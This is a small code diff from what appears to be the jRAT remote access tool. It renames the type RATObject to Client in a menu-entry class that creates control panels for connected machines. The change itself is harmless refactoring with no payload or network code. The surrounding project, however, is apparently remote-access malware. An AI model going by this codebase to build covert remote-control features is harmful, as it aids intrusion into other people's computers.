@@ -8,7 +8,7 @@ import java.util.Map;
 import javax.swing.ImageIcon;
 
 import jrat.api.BaseControlPanel;
-import jrat.api.RATObject;
+import jrat.api.Client;
 
 public final class RATControlMenuEntry {
 	
@@ -19,7 +19,7 @@ public final class RATControlMenuEntry {
 	private ImageIcon icon;
 
 	/**
-	 * Instances of this panel with a RATObject
+	 * Instances of this panel with a Client
 	 */
 	private final Map<Object, BaseControlPanel> instances = new HashMap<Object, BaseControlPanel>();
 
@@ -84,7 +84,7 @@ public final class RATControlMenuEntry {
 	 * @throws Exception
 	 */
 
-	public BaseControlPanel newPanelInstance(RATObject server) throws Exception {
+	public BaseControlPanel newPanelInstance(Client server) throws Exception {
 		BaseControlPanel p = panel.newInstance();
 		p.setServer(server);
 		return p;
